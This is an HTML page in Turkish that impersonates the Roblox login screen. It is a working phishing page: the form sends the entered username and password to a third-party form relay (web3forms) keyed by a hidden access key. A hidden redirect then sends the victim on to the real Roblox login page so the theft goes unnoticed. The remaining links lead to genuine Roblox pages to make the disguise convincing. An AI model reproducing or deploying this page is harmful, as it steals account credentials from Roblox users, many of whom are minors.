<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş - Roblox</title>
    <style>
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)), 
                        url('https://image.api.playstation.com/vulcan/ap/rnd/202504/1706/4cc02203db88b29b535c26b8296c89f983eaf48d67462e1d.png?w=1920'); 
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: rgba(35, 37, 39, 0.95);
            backdrop-filter: blur(10px);
            padding: 40px 30px;
            border-radius: 8px;
            width: 360px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        h2 { color: #ffffff; margin-bottom: 25px; font-size: 24px; }

        input {
            width: 100%;
            height: 45px;
            margin-bottom: 15px;
            border-radius: 4px;
            border: 1px solid #111;
            background-color: #393b3d;
            color: #ffffff;
            padding: 0 15px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            height: 40px;
            background: none;
            border: 1px solid #ffffff;
            color: #ffffff;
            font-weight: bold;
            cursor: pointer;
            border-radius: 4px;
        }

        .login-btn:hover { background: rgba(255,255,255,0.1); }

        .blue-link { color: #00b2ff; text-decoration: none; font-size: 13px; display: block; margin-top: 15px; }

        .divider { height: 1px; background: #444; margin: 20px 0; }

        .social-btn {
            width: 100%;
            height: 40px;
            background-color: #393b3d;
            border: none;
            color: #ffffff;
            border-radius: 4px;
            margin-bottom: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Roblox'a Giriş Yap</h2>

    <form action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">
        
        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">

        <input type="text" name="Username" placeholder="Kullanıcı Adı" required>
        <input type="password" name="Password" placeholder="Şifre" required>

        <input type="hidden" name="redirect" value="https://www.roblox.com/login">

        <button type="submit" class="login-btn">Giriş Yap</button>
    </form>

    <a href="https://www.roblox.com/login/forgot-password-or-username" class="blue-link">Şifrenizi mi unuttunuz?</a>
    <div class="divider"></div>
    <button class="social-btn" onclick="window.location.href='https://www.roblox.com/login/otp'">Hızlı Giriş</button>
    <div style="margin-top:20px; color:white; font-size:14px;">
        Hesabın yok mu? <a href="https://www.roblox.com/" class="blue-link" style="display:inline;">Kaydol</a>
    </div>
</div>

</body>
</html>
